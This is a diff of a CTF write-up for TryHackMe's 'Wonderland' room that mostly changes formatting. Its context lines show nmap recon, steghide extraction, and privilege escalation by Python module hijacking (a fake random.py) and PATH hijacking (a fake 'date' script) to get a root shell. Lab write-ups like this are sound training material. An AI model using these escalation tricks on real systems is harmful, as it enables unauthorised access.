@@ -2,13 +2,13 @@
 title : Wonderland - Writeup
 ---
 
-_**Nov 10, 2020**_
+_**Jan 11, 2021**_
 
 [Wonderland](https://tryhackme.com/room/wonderland) Writeup
 
 ## Recon :
 
-```
+```sh
 bvr0n@kali:~/CTF/THM/Wonderland$ nmap -sC -sV 10.10.252.9
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 10:28 EST
 Nmap scan report for 10.10.252.9
@@ -29,7 +29,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Goin to the web page gets us only a `jpeg` image, let's download it and see what can we do with it :
 
-```
+```sh
 bvr0n@kali:~/CTF/THM/Wonderland$ wget http://10.10.252.9/img/white_rabbit_1.jpg
 bvr0n@kali:~/CTF/THM/Wonderland$ steghide extract -sf white_rabbit_1.jpg 
 Enter passphrase: 
@@ -40,6 +40,7 @@ Turns out, there is a files hidden inside that says this :
 ```
 follow the r a b b i t
 ```
+
 I didn't understand it at first, but when i brute forced directories i got the idea :
 
 ```bash
@@ -71,7 +72,9 @@ After some enumeration, i found out that the `/root/` is accessible by everyone 
 in Alice home directory there is a script that basically import the random module.
 
 So, we can create a file named random.py in our current working directory that executes `/bin/bash` This way the python file should be loaded instead of the "real" random module, and in turn give us a shell as the rabbit user.
-`random.py` :
+
+#### `random.py` :
+
 ```python 
 import os
 
@@ -96,7 +99,7 @@ Segmentation fault (core dumped)
 
 We can abuse this by exporting our own `$PATH` and providing a fake `date` script that will give us a shell with the user :
 
-```
+```bash
 rabbit@wonderland:/tmp$ cat date 
 #!/bin/bash
 /bin/bash
@@ -134,14 +137,4 @@ root@wonderland:~# whoami; id
 root
 uid=0(root) gid=1003(hatter) groups=1003(hatter)
 ```
-
-<br>
-best regards
-
-[bvr0n](https://github.com/bvr0n)
-
-
-<br>
-[back to main()](http://bvr0n.github.io/)
-
-<br>
+Hope you like it.
